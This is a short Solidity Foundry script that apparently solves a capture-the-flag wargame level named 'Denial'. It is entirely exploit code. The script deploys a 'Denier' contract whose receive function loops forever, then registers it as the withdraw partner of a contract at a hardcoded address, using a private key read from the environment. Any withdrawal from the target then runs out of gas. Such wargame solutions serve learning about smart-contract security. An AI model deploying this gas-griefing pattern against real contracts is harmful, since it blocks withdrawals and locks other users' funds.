pragma solidity ^0.8.0;
import "../instances/Ilevel20.sol";
import "forge-std/Script.sol";

contract Level20 is Script {
    Denial level20 =
        Denial(payable(0x334f9391735Df924cc8F7Cc9DF73c534d2eEB59E));

    function run() external {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(attackerPrivateKey);
        Denier denier = new Denier();
        level20.setWithdrawPartner(address(denier));
        vm.stopBroadcast();
    }
}

contract Denier {
    receive() external payable {
        while (true) {}
    }
}
